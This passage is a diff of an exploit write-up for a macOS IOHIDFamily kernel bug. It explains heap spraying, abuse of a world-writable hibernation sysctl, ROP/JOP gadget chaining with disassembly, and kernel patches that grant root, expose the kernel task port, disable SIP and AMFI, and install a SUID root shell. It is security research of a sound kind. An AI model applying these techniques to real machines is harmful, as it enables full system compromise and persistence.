+Despite the authors of the paper stating that their attack works also in virtualised environments, I observed timings for mapped and unmapped pages to be indistinguishable on a High Sierra installation running inside VirtualBox (and that's the only VM I tried). But whatever, I've already shown that my bug can leak the kernel slide too if need be. :P
 
 ### Getting `rip` control
 
-Back to corrupting stuff on the heap with `evg`! Since we want stuff from here on out to work with both ways of leaking the kernel slide, we're gonna have to to assume that we're back to not knowing the kernel address of our shared memory and not being able to read kernel memory - the only thing we learned is the kernel slide. Now we're back for more, and we're here with a constraint: we want our exploit to run as fast a possible, i.e. fast enough that, on a shutdown, we'd be able to slip in between the user getting logged out and the kernel forcibly killing every last process alive.
+Back to corrupting stuff on the heap with `evg`! Since we want things from here on out to work with both ways of leaking the kernel slide, we're gonna have to to assume that we're back to not knowing the kernel address of our shared memory and not being able to read kernel memory - the only thing we can take for granted is the kernel slide. Now we're back for more, and we're here with a constraint: we want our exploit to run as fast a possible, i.e. fast enough that, on a shutdown, we'd be able to slip in between the user getting logged out and the kernel killing us.
 
-To that end we're gonna do one heap spray _before_ obtaining the `IOHIDUserClient` port, and then avoid any kind of bulk iteration (except final deallocation), including both "reading back" and reallocation. In regard to our `evg` capabilities, that eliminates all but the writing via `eventFlags` while offsetting, and that in turn requires that laying waste to the memory surrounding our target memory isn't fatal. Looking again at what we can allocate on the `kalloc_map`/`kernel_map` (data buffers, pointer buffers and kmsg's), the only thing that lets us do that is again a pointer buffer, ideally containing a single pointer surrounded by nothingness, such as e.g. demonstrated earlier with a large `OSArray` containing a single element (I'll call this an "inflated array"). This time we're gonna change two things though:
+To that end we're gonna do a single heap spray _before_ obtaining the `IOHIDUserClient` port, and then avoid any kind of bulk iteration (except final deallocation), which includes both "reading back" and reallocating. In regard to our `evg` capabilities, that eliminates all but the writing via `eventFlags` while offsetting, and that in turn requires that laying waste to the memory surrounding our target memory be not fatal. Looking again at what we can allocate on the `kalloc_map`/`kernel_map` (that is: data buffers, pointer arrays and kmsg's), the only thing that lets us do that is again a pointer array, ideally containing a single pointer surrounded by nothingness, such as e.g. demonstrated earlier with our "inflated array". This time we're gonna change two things though:
 
--   We're gonna use `io_service_add_notification_ool` rather than `IOSurface` to call `OSUnserializeXML` and keep the result in the kernel, because that returns us a mach port whose destruction we can invoke with the `_kernelrpc_mach_port_deallocate_trap` mach trap, which means that we can deallocate our sprayed objects very fast, without even the need for a MIG message.
--   Instead of just one inflated array, we're gonna cram lots of them into a single handle, so we can increase both allocation and deallocation efficiency, and decrease overhead of whatever `io_service_add_notification_ool` is actually supposed to do! Here we're limited to 4096 bytes of data we can feed to `OSUnserializeXML` (which is a property of the MIG message defined for `io_service_add_notification_ool`), but the binary representation of an inflated array is very short:
+-   We're gonna use `io_service_add_notification_ool` rather than `IOSurface` to call `OSUnserializeXML` and keep the result in the kernel, because that returns us a mach port (which I'll call the "notification port"). The nice thing about that is that we can invoke its destruction with the `_kernelrpc_mach_port_deallocate_trap` mach trap, which means that we can deallocate the sprayed objects attached to it very fast, without even the need for a MIG message.
+-   Instead of just one inflated array, we're gonna cram lots of them into a single port, so we can increase both allocation and deallocation efficiency, as well as decrease the overhead of whatever `io_service_add_notification_ool` is _actually_ supposed to do. Here we're limited to 4096 bytes of data we can feed to `OSUnserializeXML` (which is just a property of the MIG message defined for `io_service_add_notification_ool`), but the binary representation of an inflated array is _very_ short:
 
     ```c
     kOSSerializeArray | 0x3000,                             // 4 bytes for the array
     kOSSerializeEndCollection | kOSSerializeBoolean | 1,    // and 4 bytes for its content
     ```
 
-    If we take away 4 bytes each for the mandatory magic, dictionary tag, `OSSymbol` tag, `OSSymbol` contents and `OSArray` tag (which will contain our inflated arrays), we could max this out at 509 inflated arrays! Due to later involvements however, we're not gonna drive it that far and instead leave it at a nice 256, which is still more than enough.
+    If we take away 4 bytes each for the mandatory magic, dictionary tag, `OSSymbol` tag, `OSSymbol` contents and `OSArray` tag (which will contain our inflated arrays), we could max this out at 509 inflated arrays per notification port! Due to later involvements however, we're not gonna drive it that far and instead leave it at a nice 256, which is still more than enough.
 
-At that point the memory we're targeting with `evg` should have a lonely pointer to `kOSBooleanTrue` every `0x3000` bytes, and all zeroes in between which are never used by the kernel. The avid reader will notice that `0x3000` is less than the size of our shared memory, but using a size of `0x6000` wouldn't help either, because we don't know where exactly those pointers are anyway. We only know that they're at the beginning of a page-aligned buffer, but on x86 there's 3 pages in `0x3000`, which gets us back to `x`, `x + 0x1000` and `x + 0x2000` as possible locations. So even if we chose `0x6000` instead, we'd just have 6 possible locations now and trying all of them would put us over the adjacent block just the same. In order to fix that, we first have to work out some other parts of our exploit though, so let's just put it off until later.
+At that point the memory we're targeting with `evg` should have a lonely pointer to `kOSBooleanTrue` every `0x3000` bytes, and all zeroes in between which are never used by the kernel. The avid reader might notice that `0x3000` is less than the size of our shared memory, but using a size of `0x6000` wouldn't help either, because we don't know where exactly those pointers are anyway. We only know that they're at the beginning of a page-aligned buffer, but on x86 there's 3 pages in `0x3000`, which gets us back to `x`, `x + 0x1000` and `x + 0x2000` as possible locations. So even if we chose `0x6000` instead, we'd just have 6 possible locations now and trying all of them would put us over the adjacent block just the same. In order to fix that, we first have to work out some other parts of our exploit though, so let's just put that off until later.
 
-Now, we wanna corrupt a pointer, but to where? The only thing we have is the kernel slide, and whatever we change our pointer to, it's gonna have to look at least in parts like a valid OSObject. There wouldn't just be some user-writeable memory in the kernel's __DATA segment that we could use or something, right? Turns out, there is! In [`iokit/Kernel/IOHibernateIO.cpp`](TODO) there is defined a `static hibernate_statistics_t _hibernateStats`, where `hibernate_statistics_t` is defined as follows:
+Now, we wanna corrupt a pointer, but to where? The only thing we have is the kernel slide, and whatever we change our pointer to, it's gonna have to look at least in parts like a valid OSObject. There wouldn't just be some user-writeable memory in the kernel's __DATA segment that we could use or something, right? Turns out, there is! In [`IOHibernateIO.cpp`](https://opensource.apple.com/source/xnu/xnu-4570.1.46/iokit/Kernel/IOHibernateIO.cpp.auto.html) there is declared a `static hibernate_statistics_t _hibernateStats`, where `hibernate_statistics_t` is defined as follows:
 
 ```c
 struct hibernate_statistics_t
@@ -1331,7 +1360,7 @@ SYSCTL_UINT(_kern, OID_AUTO, hibernatehidready,
             &_hibernateStats.hidReadyTime, 0, "");
 ```
 
-Well if `CTLFLAG_RW | CTLFLAG_ANYBODY` isn't an interesting combination on a global variable! In human terms, this means any process as full read-write capabilities on the struct members `graphicsReadyTime`, `wakeNotificationTime`, `lockScreenReadyTime` and `hidReadyTime`, which, oh so conveniently, lie all next to each other!
+Well if `CTLFLAG_RW | CTLFLAG_ANYBODY` isn't an interesting combination on a global variable! In human terms, this means any process has full read-write capabilities on the struct members `graphicsReadyTime`, `wakeNotificationTime`, `lockScreenReadyTime` and `hidReadyTime`, which, oh so conveniently, lie all next to each other!
 
     bash$ sysctl kern.hibernategraphicsready
     kern.hibernategraphicsready: 0
@@ -1340,7 +1369,15 @@ Well if `CTLFLAG_RW | CTLFLAG_ANYBODY` isn't an interesting combination on a glo
     bash$ sysctl kern.hibernategraphicsready
     kern.hibernategraphicsready: 123
 
-Note that, like our bug, the entire facility containing these sysctl's only exists on macOS, since hibernation is not a thing on mobile devices. Also, `_hibernateStats` is not exported to the kernel's symbol table, but obtaining it is easy enough, given that the first real statement in `hibernate_machine_init()` (which _is_ exported) is a call to `bzero` on `_hibernateStats`:
+And on top of that, there's this:
+
+```c++
+SYSCTL_STRUCT(_kern, OID_AUTO, hibernatestatistics,
+              CTLTYPE_STRUCT | CTLFLAG_RD | CTLFLAG_NOAUTO | CTLFLAG_KERN | CTLFLAG_LOCKED,
+              &_hibernateStats, hibernate_statistics_t, "");
+```
+
+This additionally gives us readonly access to _all_ of `_hibernateStats`, which might come in handy when leaking data. Note that, like our bug, the entire facility containing these sysctl's only exists on macOS, since hibernation is not a thing on mobile devices. Also, `_hibernateStats` is not exported to the kernel's symbol table, but obtaining its address is easy enough, given that the first statement in `hibernate_machine_init()` (which _is_ exported) is a call to `bzero` on `_hibernateStats`:
 
 ```
 ;-- _hibernate_machine_init:
@@ -1359,39 +1396,260 @@ Note that, like our bug, the entire facility containing these sysctl's only exis
 
 The address of `_hibernateStats` is pretty evidently `0xffffff8000b10bc8` in this case.
 
-So, we've just made 16 bytes of writeable kernel memory whose address we can derive. At this point, let's get back to the problem we put aside earlier, of how we fix the corruption of adjacent pointers when offsetting `evg`: the original pointer we're corrupting has the value `kOSBooleanTrue`, which is a location at the beginning of the `zone_map`. And the value we wanna rewrite it to is `&_hibernateStats`, which is somewhere in the kernel's `__DATA` segment. What's interesting about those two is that they aren't too far apart - the main kernel binary always resides somewhere between `0xffffff8000000000` and `0xffffff8020000000`, the `zone_map` starts at values usually lower than `0xffffff8040000000`, and since `kOSBooleanTrue` is allocated very early on, it's exceedingly likely to not be too far off from the beginning of the `zone_map`. Effectively, the addresses `kOSBooleanTrue` and `&_hibernateStats` will have the same values in their top 32 bits, namely `0xffffff80`! For us, that means we only have to rewrite the lower 32 bits, which reduces the memory we corrupt. So what memory _do_ we corrupt, exactly? We're dealing with entire page sizes, and the only thing `evg` has that far out is `lleq`. Now, I've created a tiny little program in [`data/align.c`](TODO) that models five pages (all but the first) each holding a pointer in the first 8 bytes, and simulates how the initialisation of `lleq` intersects with each of these pointers. It takes a single signed int as command line argument, which is the amount of 4-byte-blocks by which `evg` is to be shifted up or down. The output is displayed as a list of all addresses where `lleq` initialisation happens, which could possibly intersect with a pointer. If intersection does indeed occur, the specific address is coloured red. Example:
+So we just made 16 bytes of writeable kernel memory whose address we can derive. At this point, let's get back to the problem we put aside earlier of how we fix the corruption of adjacent pointers when offsetting `evg`: the original pointer we're corrupting has the value `kOSBooleanTrue`, which is a location inside the `zone_map`. And the value we wanna rewrite it to is `&_hibernateStats`, which is somewhere in the kernel's `__DATA` segment. What's interesting about those two is that they aren't so far apart - the main kernel binary always resides somewhere between `0xffffff8000000000` and `0xffffff8020000000`, the `zone_map` starts at values usually lower than `0xffffff8040000000`, and since `kOSBooleanTrue` is allocated very early on, it's exceedingly likely to not be too far off from the beginning of the `zone_map`. Effectively, the addresses `kOSBooleanTrue` and `&_hibernateStats` will have the same top 32 bits, namely `0xffffff80`! For us, that means we only have to rewrite the lower 32 bits, which reduces the amount of memory we corrupt. So what memory _do_ we corrupt, exactly? We're dealing with entire page sizes, and the only thing `evg` has beyond the first page is `lleq`. Now, I've created another little program in [`data/align.c`](../data/align.c) that models five pages (all but the first) each holding a pointer in the first 8 bytes, and which simulates how the initialisation of `lleq` intersects with each of these pointers. It takes a single signed int as command line argument, which is the amount of 4-byte-blocks by which `evg` is to be shifted up or down. The output is displayed as a list of all addresses where `lleq` initialisation happens, which could possibly intersect with a pointer. If intersection does indeed occur, the specific address is coloured red. Example:
 
-    bash$ ./align 0
-    0x0fe0 0x0fe4 0x0fe8 0x0ff4 0x0ff8 0x0ffc 0x1040 0x1044 0x1048 0x1054 0x1058 0x105c
-    0x2000 0x2004 0x2008 0x2014 0x2018 0x201c 0x2060 0x2064 0x2068 0x2074 0x2078 0x207c
-    0x2fc0 0x2fc4 0x2fc8 0x2fd4 0x2fd8 0x2fdc 0x3020 0x3024 0x3028 0x3034 0x3038 0x303c
-    0x3fe0 0x3fe4 0x3fe8 0x3ff4 0x3ff8 0x3ffc 0x4040 0x4044 0x4048 0x4054 0x4058 0x405c
-    0x5000 0x5004 0x5008 0x5014 0x5018 0x501c 0x5060 0x5064 0x5068 0x5074 0x5078 0x507c
+[![screenshot][img7]][img7]
 
 Here the values `0x2000`, `0x2004`, `0x5000` and `0x5004` are red, telling us that both halves of the pointers on pages 3 and 6 would be corrupted entirely if we were to align `evg->cursorSema` to the start of page 1. If we wanted to know how it looks if we align `evg->eventFlags` to the start of page 1 (which is how we'd rewrite the lower 32 bits of `kOSBooleanTrue` to `&_hibernateStats`), we'd pass `-3` as argument since we'd shift `evg` 3 times the size of a `uint32_t` backwards:
 
-    bash$ ./align -3
-    0x0fd4 0x0fd8 0x0fdc 0x0fe8 0x0fec 0x0ff0 0x1034 0x1038 0x103c 0x1048 0x104c 0x1050
-    0x1ff4 0x1ff8 0x1ffc 0x2008 0x200c 0x2010 0x2054 0x2058 0x205c 0x2068 0x206c 0x2070
-    0x2fb4 0x2fb8 0x2fbc 0x2fc8 0x2fcc 0x2fd0 0x3014 0x3018 0x301c 0x3028 0x302c 0x3030
-    0x3fd4 0x3fd8 0x3fdc 0x3fe8 0x3fec 0x3ff0 0x4034 0x4038 0x403c 0x4048 0x404c 0x4050
-    0x4ff4 0x4ff8 0x4ffc 0x5008 0x500c 0x5010 0x5054 0x5058 0x505c 0x5068 0x506c 0x5070
+[![screenshot][img8]][img8]
 
-Presenting this in Markdown isn't quite so impressive due to the lack of colors, but if you run this yourself, you'll see that none of these values are red now! In other words, using `eventFlags` to rewrite the first 4 bytes of a page will leave the first 8 bytes on all following pages entirely intact! We really are blessed with immense luck today!
+Lo and behold, none of the values are red! In other words, using `eventFlags` to rewrite the first 4 bytes on a page will leave the first 8 bytes on all following pages entirely intact! We really are blessed with immense luck today!
 
-Anyway, we can celebrate later. For now we need to come up with a way of turning our `_hibernateStats` memory into something useful. We have 16 bytes, which means exactly two pointers. Since our memory is gonna be interpreted as an `OSObject`, the first 8 bytes will need to function as vtable pointer, and then we could either use the remaining 8 bytes as data and try to find a pointer in one of the kernel's constant sections that points to some code doing something useful with that data, or we could forge the "fake vtable" in a way that the remaining 8 bytes are used as the pointer to the virtual function that is invoked on our object (which is going to be `->taggedRelease()` btw, when we deallocate everything).  
+Anyway, we can celebrate later. For now we need to come up with a way of turning our `_hibernateStats` memory into something useful. We have 16 bytes, which means exactly two pointers. Since our memory is gonna be interpreted as an `OSObject`, some 8 bytes will need to function as vtable pointer, and then we could either use the remaining 8 bytes as data and try to find a pointer in one of the kernel's constant sections that points to some code doing something useful with that data, or we could forge the "fake vtable" in a way that the remaining 8 bytes are used as the pointer to the virtual function that is invoked on our object (which is going to be `->taggedRelease()` at offset `0x50` btw, when we deallocate everything).  
 The first method sounds rather hard to pull off, since the kernel is most likely only gonna contain pointers to actual functions (as opposed to useful ROP gadgets), and any virtual C++ function is out of the question anyway, since in valid `OSObjects`, bytes 9 to 12 are used for the object reference counter, which, if accessed, is only ever increased or decreased, and never exported or used in any other way.  
-The second method however gets us straight to one arbitrary gadget worth of execution, which doesn't sound so bad already.
+The second method however gets us straight to one arbitrary gadget worth of execution, which doesn't sound so bad already. It isn't enough to run arbitrary code though, for that we kinda need a place to put a ROP chain at. Our shared memory would do nicely for that, but is a single gadget enough to get its address back to userland? At least we can do this in two steps - if we find a suitabe gadget, we can corrupt one pointer in to only leak the shmem kernel address, and then in a second step corrupt another pointer to run a full ROP chain.  
+But for now we can run exactly one gadget.
+
+_This part is implemented in [`src/hid/heap.c`](../src/hid/heap.c) and [`src/hid/main.c`](../src/hid/main.c)._
+
+### Turning `rip` into ROP
+
+In order to run ROP, we need the kernel shmem address. And in order to leak that, we need to look at what values we're gonna have in registers at the time our gadget is invoked. This is gonna happen when we free everything, i.e. with a stack trace of:
+
+    array[i]->taggedRelease()
+    OSArray::flushCollection()
+    OSArray::free()
+    ...
+
+Where `taggedRelease()` is an address supplied by us. So we're being called from `flushCollection()`, which looks like this:
+
+```
+;-- OSArray::flushCollection:
+0xffffff800081f0d0      55             push rbp
+0xffffff800081f0d1      4889e5         mov rbp, rsp
+0xffffff800081f0d4      4157           push r15
+0xffffff800081f0d6      4156           push r14
+0xffffff800081f0d8      53             push rbx
+0xffffff800081f0d9      50             push rax
+0xffffff800081f0da      4989ff         mov r15, rdi
+0xffffff800081f0dd      41f6471001     test byte [r15 + 0x10], 1
+0xffffff800081f0e2      7427           je 0xffffff800081f10b
+0xffffff800081f0e4      f6052f0a2b00.  test byte [0xffffff8000acfb1a], 4
+0xffffff800081f0eb      7510           jne 0xffffff800081f0fd
+0xffffff800081f0ed      488d3dedaa1c.  lea rdi, str._Trying_to_change_a_collection_in_the_registry___BuildRoot_Library_Caches_com.apple.xbs_Sources_xnu_xnu_4570.1.46_libkern_c___OSCollection.cpp:67
+0xffffff800081f0f4      31c0           xor eax, eax
+0xffffff800081f0f6      e8a5d9a4ff     call sym._panic
+0xffffff800081f0fb      eb0e           jmp 0xffffff800081f10b
+0xffffff800081f0fd      488d3d6fab1c.  lea rdi, str.Trying_to_change_a_collection_in_the_registry
+0xffffff800081f104      31c0           xor eax, eax
+0xffffff800081f106      e8a5ceffff     call sym._OSReportWithBacktrace
+0xffffff800081f10b      41ff470c       inc dword [r15 + 0xc]
+0xffffff800081f10f      41837f2000     cmp dword [r15 + 0x20], 0
+0xffffff800081f114      7425           je 0xffffff800081f13b
+0xffffff800081f116      31db           xor ebx, ebx
+0xffffff800081f118      4c8d3511f92a.  lea r14, sym.OSCollection::gMetaClass
+0xffffff800081f11f      90             nop
+0xffffff800081f120      498b4718       mov rax, qword [r15 + 0x18]
+0xffffff800081f124      89d9           mov ecx, ebx
+0xffffff800081f126      488b3cc8       mov rdi, qword [rax + rcx*8]
+0xffffff800081f12a      488b07         mov rax, qword [rdi]
+0xffffff800081f12d      4c89f6         mov rsi, r14
+0xffffff800081f130      ff5050         call qword [rax + 0x50]
+0xffffff800081f133      ffc3           inc ebx
+0xffffff800081f135      413b5f20       cmp ebx, dword [r15 + 0x20]
+0xffffff800081f139      72e5           jb 0xffffff800081f120
+0xffffff800081f13b      41c747200000.  mov dword [r15 + 0x20], 0
+0xffffff800081f143      4883c408       add rsp, 8
+0xffffff800081f147      5b             pop rbx
+0xffffff800081f148      415e           pop r14
+0xffffff800081f14a      415f           pop r15
+0xffffff800081f14c      5d             pop rbp
+0xffffff800081f14d      c3             ret
+```
+
+- `call qword [rax + 0x50]` is the code that invokes our gadget.
+- `rdi` is gonna be our fake object (i.e. the address of `_hibernateStats.graphicsReadyTime`).
+- `rax` is gonna be our fake vtable (i.e. the address of `_hibernateStats.lockScreenReadyTime` minus `0x50`).
+- `rsi` and `r14` will be a pointer to the `OSCollection` meta class.
+- `rbx` and `rcx` will be the array index of our object, i.e. `0`.
+- `r15` will be a pointer to our "parent" `OSArray` object.
+
+Ideally what we want is the address of the `OSArray`'s pointer array (because that's the one with a fixed offset from our shared memory). We can see that it is temporarily loaded into `rax` (`mov rax, qword [r15 + 0x18]`), but that register is moments later replaced with a pointer to the object's vtable. As a little excourse, that actually used to be different on Sierra, where the loop looked like this:
+
+```
+0xffffff80008377d0      89d8           mov eax, ebx
+0xffffff80008377d2      498b4f18       mov rcx, qword [r15 + 0x18]
+0xffffff80008377d6      488b3cc1       mov rdi, qword [rcx + rax*8]
+0xffffff80008377da      488b07         mov rax, qword [rdi]
+0xffffff80008377dd      4c89f6         mov rsi, r14
+0xffffff80008377e0      ff5050         call qword [rax + 0x50]
+0xffffff80008377e3      ffc3           inc ebx
+0xffffff80008377e5      413b5f20       cmp ebx, dword [r15 + 0x20]
+0xffffff80008377e9      72e5           jb 0xffffff80008377d0
+```
+
+Here the pointer array address was loaded into `rcx`, which _wasn't_ overwritten before jumping to our address. Now, gadgets dealing with `rcx` are a somewhat hard to come by, but I managed to find this little beauty:
+
+```
+0xffffff80005c0772      010f           add dword [rdi], ecx
+0xffffff80005c0774      97             xchg eax, edi
+0xffffff80005c0775      c3             ret
+```
+
+First of all, the `xchg eax, edi` is harmless here since `OSObject::taggedRelease` returns nothing, and we can thus treat both `rax` and `rdi` as scratch registers. So this gadget adds the lower 32 bits of the buffer address to the value already present in `_hibernateStats.graphicsReadyTime`, which is fine since we know the original value and can thus calculate the original value of `ecx`. Going back to the very beginning of this write-up and looking at some samples of where our shared memory would be mapped at under Sierra, we see the following:
+
+    ffffff91ec867000
+    ffffff91f3ec2000
+    ffffff91f48f3000
+    ffffff91f6a2c000
+    ffffff91f828a000
+    ffffff91fc02a000
+    ffffff91fe160000
+    ffffff91fe6b3000
+    ffffff91ffc8a000
+    ffffff9209150000
+    ffffff92103a8000
+    ffffff9211be0000
+    ffffff9213141000
+    ffffff9215c04000
+    ffffff921a2ce000
+    ffffff921bf03000
+
+The shmem kernel address could have its upper 32 bits either `ffffff91` or `ffffff92`, but depending on that the lower 32 bits would either be very high (`0xf...`, `0xe...`) or very low (`0x0...`, `0x1...`). So after subtracting the the size we offset `evg` by from the original `ecx` value, we can simply assume that if the 31st bit is set, the upper 32 bits are `ffffff91`, otherwise they are `ffffff92` - or perform a signed integer addition, which does precisely that. :P
+
+However, that was then and this is now. On High Sierra, we no longer get the value nicely in `rcx` anymore (and in fact we also didn't back on El Capitan). The only place we could still get it now would be directly from the `OSArray` object, i.e. `[r15 + 0x18]`. Unfortunately I did not find a gadget copying data from `[r15 + 0x18]` to an address based off `rax` or `rdi`. The outlandish thought of calling `memcpy` did cross my mind though, since there is a suitable target address in `rdi` already - we'd only have to get `r15` into `rsi` (plus or minus some bytes), and a reasonable size into `rdx` (which holds the value `1` from the invocation of `taggedRelease()` on the `OSArray` - not enough for our intentions). Surely that's not something we can achieve with just one gadget worth of execution, right? No, actually not. I mean, we get halfway there by abusing `PE_current_console()`:
+
+```
+;-- _PE_current_console:
+0xffffff8000903040      55             push rbp
+0xffffff8000903041      4889e5         mov rbp, rsp
+0xffffff8000903044      488d35adcf1c.  lea rsi, 0xffffff8000acfff8
+0xffffff800090304b      ba90000000     mov edx, 0x90
+0xffffff8000903050      e8fbbf80ff     call sym._memcpy
+0xffffff8000903055      31c0           xor eax, eax
+0xffffff8000903057      5d             pop rbp
+0xffffff8000903058      c3             ret
+```
+
+If we chip in at `mov edx, 0x90`, we get a somewhat reasonable size (we're still overflowing `_hibernateStats`, since `rdi` points to `_hibernateStats.graphicsReadyTime`, but we can deal with repairs later), which leaves only the problem of getting `r15` into `rsi`, but also creates a new problem: it pops a value off the stack before returning. If we don't push something before jumping to `0xffffff800090304b`, we're gonna panic right away when we hit that `ret`. So no matter what, we need a second gadget. And since we can actually fit two pointers into our `_hibernateStats` memory, we can sort of cheat our constraints. Recall that the reason we can run only one gadget is because we need the other pointer as fake vtable, since the code that calls us does a double dereference. But once we arrive at our gadget, we don't technically need the fake vtable any longer. If only we had a way to pause a kernel thread...
+
+But since we're in a multithreaded system, we can actually make that happen! Say we have a gadget like `jmp [rax + 0x50]` that is first invoked like `call [rax + 0x50]` (i.e. the address is loaded from exactly the same location) - then we effectively have achieved a busy wait in kernel mode. Now all we have to do back in userland is set up an `alarm()` timer with a sufficiently high timeout before triggering that gadget, start a second thread that does nothing but continue to exist, and mask the main thread against `SIGALRM`. Then when the kernel reaches our gadget it only takes the amount of time we specified and boom, we get a `SIGALRM` sent to our second thread! Now we first switch out the address that used to be the fake vtable, and second the address our gadget is looping on, which will then immediately be executed. That now puts us at **two** gadgets worth of execution! (Actually writing a 64-bit pointer in 32-bit chunks is normally a bad idea when that value is continuously used, but given that the kernel's `__TEXT` segment is a lot smaller than `0x100000000`, we can once more leave the top 32 bits untouched and just swap out the bottom half, which happens in a single step.) Now we put `0xffffff800090304b` where our fake vtable pointer used to be, and then have to find a gadget that:
+
+- moves `r15` to `rsi`,
+- pushes exactly one value onto the stack,
+- and transfers control to either `[rdi]` or `[rax + 0x48]`.
+
+Conveniently enough, there seems to be no shortage of such gadgets:
+
+```
+0xffffff8000647067      4c89fe         mov rsi, r15
+0xffffff800064706a      ff5048         call qword [rax + 0x48]
+```
+
+Alright, so we've achieved this complete function call:
+
+```c++
+memcpy(&_hibernateStats.graphicsReadyTime, osarray, 0x90);
+```
+
+Now we just have to do a `sysctlbyname("kern.hibernatestatistics")`, read the value of our pointer array from `&graphicsReadyTime + 0x18`, and with that calculate the kernel address of our shared memory. That is, one _possible_ address actually. If you recall the `x`, `x + 0x1000` and `x + 0x2000` stuff from earlier, that means we might actually be off one or two pages. But that doesn't matter much, we'll just make sure that our ROP chain fits on a single page and copy it to each of the first three pages of our shared memory. :)
+
+To exploit that newly gained freedom, we only need to corrupt another `kOSBooleanTrue` pointer and point something to shared memory. At this point, do you remember earlier when we settled for 256 instead of 509 inflated arrays per notification port? This is where that comes into play. Since we're freeing 256 arrays at once before returning to userland, `0x3000000` bytes of memory are gone now, so we have to add at least that amount to how much we offset `evg` in order not to touch unmapped memory and cause a panic. Since the way we offset `evg` actually overlaps 12 bytes with the _previous_ allocation, and since there may be holes or other allocations on the map too, I'v chosen to double the amount I add to the offset, just to be safe. That puts us at 6MB though, which isn't so little when playing at the edge of mapped memory. Had we used 509 arrays per notification port then that value would be even higher, which might make things harder for us. 256 seems to strike a good balance.
+
+Now at this point all that stands between us and arbitrary code execution is pivoting the stack. There just happens to exist a very nice function on x86:
+
+```
+;-- _x86_init_wrapper:
+0xffffff800021c510      4831ed         xor rbp, rbp
+0xffffff800021c513      4889f4         mov rsp, rsi
+0xffffff800021c516      ffd7           call rdi
+```
+
+If we chip in on the second instruction, this effectively gives us a function that takes a new `rip` as first argument and a new stack pointer as second. Of course we have to load these two values from memory first, which can be conveniently achieved with the JOP gadget `OSSerializer::serialize` (I believe this was first used by [Benjamin Randazzo][benjamin] in [Trident](https://github.com/benjamin-42/Trident/blob/master/Trident/exploit.c#L82-L101)):
+
+```
+;-- OSSerializer::serialize:
+0xffffff800083dad0      55             push rbp
+0xffffff800083dad1      4889e5         mov rbp, rsp
+0xffffff800083dad4      4889f2         mov rdx, rsi
+0xffffff800083dad7      488b4720       mov rax, qword [rdi + 0x20]
+0xffffff800083dadb      488b4f10       mov rcx, qword [rdi + 0x10]
+0xffffff800083dadf      488b7718       mov rsi, qword [rdi + 0x18]
+0xffffff800083dae3      4889cf         mov rdi, rcx
+0xffffff800083dae6      5d             pop rbp
+0xffffff800083dae7      ffe0           jmp rax
+```
+
+Now, since we committed to only rewriting the lower 32 bits of a pointer with `evg`, we cannot put our fake vtable pointer on shared memory since that's out of reach. Instead we'll simply put that one still in `_hibernateStats` and just _point_ it to shared memory. That leaves us with `rdi` pointing to `_hibernateStats` and only `rax` to shmem however, so we'll have to run another JOP gadget that updates `rdi` suitably:
+
+```
+0xffffff8000660621      488b7840       mov rdi, qword [rax + 0x40]
+0xffffff8000660625      4c89f6         mov rsi, r14
+0xffffff8000660628      ff5008         call qword [rax + 8]
+```
+
+At long last we get `rsp` pointing to shared memory and can chain gadgets to each other like we're used to.
+
+_This is implemented in [`src/hid/main.c`](../src/hid/main.c) with a gadget finder residing in [`src/hid/rop.c`](../src/hid/rop.c)._
 
 ### Wreaking havoc
 
+After all the trouble we went through to get here, it's high time to do some damage! Let's get root, bring the kernel task port to userland, install a root shell, and disable SIP and AMFI for good! :D
 
+Getting root is trivial with ROP. We just zero out the fields `cr_uid`, `cr_ruid` and `cr_svuid` of our process' posix credentials:
 
-<!-- We've already seen most of the techniques, so it's time to do some actual damage! Let's get root, bring the kernel task port to userland, install a root shell, and disable SIP and AMFI for good! :D -->
+```c
+bzero(posix_cred_get(proc_ucred(current_proc())), 12);
+```
 
+In order to update things like e.g. our host port (to type `IKOT_HOST_PRIV`) we should also call `setuid(0)` thereafter, but we can do that from userland once we get back out of ROP.
 
+Next up is the kernel task port, which is a bit more problematic than it used to be in the past. I explain the technical details in the [readme of my hsp4 kext](https://github.com/Siguza/hsp4#technical-background) so I'll leave them out here, but bottom line is that there's an evil pointer comparison, which we get around by means of this:
+
+```c
+mach_vm_remap(
+    kernel_map,
+    &remap_addr,
+    sizeof(task_t),
+    0,
+    VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR,
+    zone_map,
+    kernel_task,
+    false,
+    &dummy,
+    &dummy,
+    VM_INHERIT_NONE
+);
+mach_vm_wire(&realhost, kernel_map, remap_addr, sizeof(task_t), VM_PROT_READ | VM_PROT_WRITE);
+realhost.special[4] = ipc_port_make_send(ipc_port_alloc_special(ipc_space_kernel));
+ipc_kobject_set(realhost.special[4], remap_addr, IKOT_TASK);
+```
+
+That makes it possible to obtain a working kernel task port from userland by calling `host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &kernel_task)` as long as we're root. Once we have that, we can put our ROP chain to rest and carry out the rest of our plans from userland, which I generally find a lot easier.  
+One last thing should better happen in ROP though: repairs. Remember when we overflowed `_hibernateStats` with our `memcpy` of `0x90` bytes? That might've corrupted things. On Sierra there doesn't seem to be anything important there so `berzo`'ing out the memory suffices. On High Sierra though, `gFSLock` sits there, and since that's a pointer to an `IOLock`, we're gonna get a panic if the kernel tries to dereference it. Luckily for us that only happens in combination with hibernation, which shouldn't occur while we're running anyway. But if we don't repair it, the machine is gonna panic then next time it is put to sleep (believe me, this was _fun_ to debug). A simple call to `IOLockAlloc` saves us all that trouble though. In the future there might also be arbitrary other things after `_hibernateStats` - you just gotta adapt to whatever you find.
+
+With that, let's leave ROP be and go back to userland. We should have root now, so the first thing we do is that `setuid(0)` to update our host port, and then we use that to get the kernel task port. Now we wanna disable SIP and AMFI, and install a root shell. Being root, we could already put a SUID binary somewhere - but obviously we wanna put it in a cool place, like `/System/pwned`. The only thing stopping us from doing all that are MAC policies. A number of file ops prevent us from making changes in `/System`, and the NVRAM ops prevent us from setting adding `amfi_get_out_of_my_way=1` to `boot-args` which would disable AMFI, and from setting `csr-active-config` to `0x3ff` which would disable SIP, and which is required in order for `amfi_get_out_of_my_way` to be honoured. So let's just zero out all file-system- and nvram-related ops from all policies, and we're good to go.
+
+_This is implemented in [`src/hid/rop.c`](../src/hid/rop.c) (ROP chain), [`src/hid/main.c`](../src/hid/main.c) (kernel patches and persistence) and [`src/helper/helper.c`](../src/helper/helper.c) (root shell)._
+
+Having achieved all that, there is nothing left for us to do but print some awesome ASCII art, and exit.
+
+[![IOHIDeous ASCII art][img9]][img9]
 
 ## Conclusion
+
+**Woah.**
+
+One tiny, ugly bug. Fifteen years. Full system compromise.
+
